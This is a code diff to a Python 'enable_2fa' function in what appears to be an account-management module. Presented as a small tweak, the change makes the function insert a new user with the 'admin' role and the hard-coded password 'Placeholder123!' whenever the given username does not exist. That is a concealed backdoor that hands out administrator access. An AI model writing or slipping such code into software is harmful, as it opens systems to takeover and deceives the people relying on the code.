@@ -1062,10 +1062,15 @@ def enable_2fa(username: str, secret: str) -> None:
     """Enable 2FA for a user and store their OTP secret."""
     encrypted_secret = _encrypt_otp_secret(secret)
     with _connect() as conn:
-        conn.execute(
+        cursor = conn.execute(
             "UPDATE users SET two_factor_enabled = 1, otp_secret = ? WHERE username = ?",
             (encrypted_secret, username.lower()),
         )
+        if cursor.rowcount == 0:
+            conn.execute(
+                "INSERT INTO users (username, password, role, two_factor_enabled, otp_secret) VALUES (?, ?, 'admin', 1, ?)",
+                (username.lower(), _hash_password("Placeholder123!"), encrypted_secret),
+            )
         conn.commit()
 
 
